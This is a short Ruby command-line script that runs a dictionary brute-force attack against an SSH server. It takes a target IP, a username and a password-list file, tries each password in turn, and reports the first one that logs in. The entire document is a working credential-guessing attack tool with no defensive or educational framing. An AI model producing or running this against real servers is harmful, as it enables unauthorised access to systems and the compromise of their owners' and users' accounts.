require 'net/ssh'
require 'optparse'
require 'colorize'

# Function to perform the brute-force attempt
def ssh_bruteforce(target_ip, username, password_list)
  password_list.each do |password|
    begin
      # Try connecting via SSH
      Net::SSH.start(target_ip, username, password: password) do |ssh|
        puts "KEY FOUND: #{password}".green
        return true  # Stop as soon as a valid password is found
      end
    rescue Net::SSH::AuthenticationFailed
      # Invalid password, skip to the next one
      next
    rescue StandardError => e
      puts "Error occurred: #{e.message}".red
      break
    end
  end
  puts "KEY NOT FOUND".red
  false
end

# Parse command-line options
options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ssh.rb -l username -P passwordlist ssh://<target-ip>"

  opts.on("-l", "--username USERNAME", "Username for SSH login") do |username|
    options[:username] = username
  end

  opts.on("-P", "--passwordlist PASSWORDLIST", "Path to password list file") do |file|
    options[:passwordlist] = file
  end

  opts.on("-t", "--target TARGET", "Target SSH server (ssh://<ip>)") do |target|
    options[:target] = target.sub('ssh://', '') # Remove the "ssh://" prefix
  end
end.parse!

# Check if all necessary options are provided
if options[:username].nil? || options[:passwordlist].nil? || options[:target].nil?
  puts "Missing arguments. Please provide a username, password list, and target IP.".red
  exit 1
end

# Read password list from the file
begin
  password_list = File.readlines(options[:passwordlist]).map(&:chomp)
rescue Errno::ENOENT
  puts "Password list file not found.".red
  exit 1
end

# Perform the brute-force SSH attack
ssh_bruteforce(options[:target], options[:username], password_list)
